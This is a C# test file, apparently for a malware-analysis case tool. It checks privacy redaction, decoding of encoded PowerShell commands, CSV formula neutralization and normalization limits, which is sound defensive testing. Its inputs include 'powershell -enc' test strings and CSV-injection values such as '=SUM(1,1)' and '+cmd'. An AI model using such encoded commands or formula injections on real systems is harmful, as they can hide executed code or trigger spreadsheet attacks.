        var data = new CaseData("case-normalized", "normalized", "sample.exe", "C:\\secret\\sample.exe", "hash", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [], [], "note")
        { NormalizedCommands = [new("powershell -enc C:\\Users\\secret\\x", "https://secret.invalid", "base64", "decoded", "", "powershell", "guid", 7, TimeSpan.Zero, [1])] };
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json,csv,html,sqlite,zip", PrivacyMode: true));
        True(File.Exists(Path.Combine(root, "normalized_commands.csv")), "normalized CSV missing");
        foreach (string file in new[] { "case.json", "normalized_commands.csv", "report.html" })
            True(!File.ReadAllText(Path.Combine(root, file)).Contains("secret.invalid", StringComparison.OrdinalIgnoreCase), "privacy redaction leaked normalized command");
        using (var zip = ZipFile.OpenRead(Path.Combine(root, "case_export.zip")))
        {
            var commandEntry = zip.GetEntry("normalized_commands.csv") ?? throw new InvalidOperationException("normalized CSV missing from ZIP");
            using var reader = new StreamReader(commandEntry.Open());
            True(!reader.ReadToEnd().Contains("secret.invalid", StringComparison.OrdinalIgnoreCase), "privacy ZIP leaked normalized command");
        }
        using (var db = new SqliteConnection($"Data Source={Path.Combine(root, "case.sqlite")}"))
        { db.Open(); using var cmd = db.CreateCommand(); cmd.CommandText = "SELECT COUNT(*) FROM normalized_commands"; Equal(1L, (long)cmd.ExecuteScalar()!); }
    }
    finally { SqliteConnection.ClearAllPools(); if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestNormalizedCommandLoadAndEvidence()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-normalized-load-" + Guid.NewGuid().ToString("N"));
    try
    {
        var eventWithCommand = new TimelineEvent(1, TimeSpan.Zero, "powershell.exe", 5, EventCategory.Process, "Process Start", "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Date")), "", EventSeverity.Medium, "Hook", "{}", ProcessGuid: "p-guid");
        var correlated = BehaviorCorrelator.Correlate([eventWithCommand]);
        var behavior = correlated.Single(e => e.Action == "Encoded Command Decoded");
        True(behavior.RawJson.Contains("evidence_event_ids", StringComparison.Ordinal), "behavior evidence ids missing");
        var data = new CaseData("case-load", "load", "x.exe", "C:\\x.exe", "h", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], correlated, [], [], "") { NormalizedCommands = CommandNormalizationService.Normalize(eventWithCommand.ObjectValue) };
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("sqlite", Compress: false));
        var loaded = new CaseService().Load(Path.Combine(root, "case.sqlite"));
        Equal(1, loaded.NormalizedCommands.Count);
    }
    finally { SqliteConnection.ClearAllPools(); if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestCsvFormulaNeutralization()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-csv-formula-" + Guid.NewGuid().ToString("N"));
    try
    {
        var data = new CaseData("case-csv", "csv", "=SUM(1,1)", "C:\\x", "h", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [new ArtifactItem("x", "+cmd", DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, 1, "@p", EventSeverity.Low)], [], "") { NormalizedCommands = [new("-danger", "=formula", "", "", "", "", "", null, null, [])] };
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("csv", Compress: false));
        string csv = File.ReadAllText(Path.Combine(root, "artifacts.csv")); True(csv.Contains("'+cmd", StringComparison.Ordinal) && csv.Contains("'@p", StringComparison.Ordinal), "CSV formula marker was not neutralized");
        True(File.ReadAllText(Path.Combine(root, "normalized_commands.csv")).Contains("'=formula", StringComparison.Ordinal), "normalized CSV formula marker was not neutralized");
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestCommandNormalizationBudget()
{
    var budget = new CommandNormalizationBudget();
    for (int i = 0; i < CommandNormalizationBudget.MaxInputs + 5; i++) CommandNormalizationService.Normalize("powershell -enc AAAA", budget);
    True(budget.Exhausted && budget.Dropped > 0, "command normalization budget did not record exhaustion");
}

static void TestBehaviorCommandNormalizationBudget()
{
    string command = "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Date"));
    var events = Enumerable.Range(1, CommandNormalizationBudget.MaxInputs + 10)
        .Select(id => new TimelineEvent(id, TimeSpan.FromSeconds(id), "powershell.exe", id, EventCategory.Process, "Process Start", command, "", EventSeverity.Low, "Hook", "{}"))
        .ToArray();
    var budget = new CommandNormalizationBudget();
    BehaviorCorrelator.Correlate(events, budget);
    True(budget.Exhausted && budget.Dropped > 0, "behavior correlation bypassed the shared command-normalization budget");
}

static void TestCommandNormalizationMalformedUtf()
{
    string invalidUtf8 = "powershell FromBase64String('" + Convert.ToBase64String([0xc3, 0x28]) + "')";
    string invalidUtf16 = "powershell -enc " + Convert.ToBase64String([0x00]);
    True(CommandNormalizationService.Normalize(invalidUtf8).Single().Status == "failed", "invalid UTF-8 was accepted");
    True(CommandNormalizationService.Normalize(invalidUtf16).Single().Status == "failed", "invalid UTF-16LE was accepted");
}

static void TestBehaviorEvidenceIdsAfterReindex()
{
    string command = "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Date"));
    var earlier = new TimelineEvent(40, TimeSpan.Zero, "cmd.exe", 4, EventCategory.Process, "Process Start", "cmd.exe", "", EventSeverity.Low, "Hook", "{}");
    var encoded = new TimelineEvent(90, TimeSpan.FromSeconds(1), "powershell.exe", 4, EventCategory.Process, "Process Start", command, "", EventSeverity.Low, "Hook", "{}");
    var behavior = BehaviorCorrelator.Correlate([encoded, earlier]).Single(e => e.Action == "Encoded Command Decoded");
    using var document = JsonDocument.Parse(behavior.RawJson);
    Equal(2, document.RootElement.GetProperty("evidence_event_ids")[0].GetInt32());
}

static void TestCommandNormalizationQualityRoundTrip()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-command-quality-" + Guid.NewGuid().ToString("N"));
    try
    {
        var health = new CollectorHealth("CommandNormalization", "degraded", DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, CommandNormalizationBudget.MaxInputs, 3, "command-normalization-limit");
        var data = new CaseData("case-quality", "quality", "x.exe", "C:\\x", "h", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [], [], "", new CaseQuality("degraded", [health], "observe", true));
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json,sqlite", Compress: false));
        var loaded = new CaseService().Load(Path.Combine(root, "case.sqlite"));
        Equal("degraded", loaded.Quality!.OverallStatus); Equal("command-normalization-limit", loaded.Quality.Collectors.Single().Message);
        True(File.ReadAllText(Path.Combine(root, "case.json")).Contains("command-normalization-limit", StringComparison.Ordinal), "quality missing from JSON");
    }
    finally { SqliteConnection.ClearAllPools(); if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void True(bool condition, string message)
{
    if (!condition) throw new InvalidOperationException(message);
}

static void Equal<T>(T expected, T actual)
{
    if (!EqualityComparer<T>.Default.Equals(expected, actual))
        throw new InvalidOperationException($"expected={expected}, actual={actual}");
}

static void Throws<T>(Action action) where T : Exception
{
    try { action(); }
    catch (T) { return; }
    throw new InvalidOperationException($"Expected {typeof(T).Name}.");
}
